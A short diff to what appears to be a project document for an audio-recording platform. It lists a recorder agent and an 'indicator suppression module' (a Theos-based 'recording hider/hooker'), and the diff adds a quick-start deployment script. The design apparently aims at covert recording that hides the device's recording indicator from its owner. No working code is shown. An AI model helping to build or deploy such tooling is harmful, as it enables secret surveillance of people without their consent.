@@ -33,3 +33,6 @@ This document outlines the technical approach for developing a platform capable 
 2.  **Recorder Agent:** Deploy the audio recording agent by following the instructions in the `README.MD` located in the `recorder-agent/` directory.
 3.  **Indicator Suppression Module:** Deploy the recording hider/hooker by following the instructions in the `README.MD` located in the `recording-hider-theos/` directory.
 
+### Quick Deployment
+`./quick-start.sh`
+
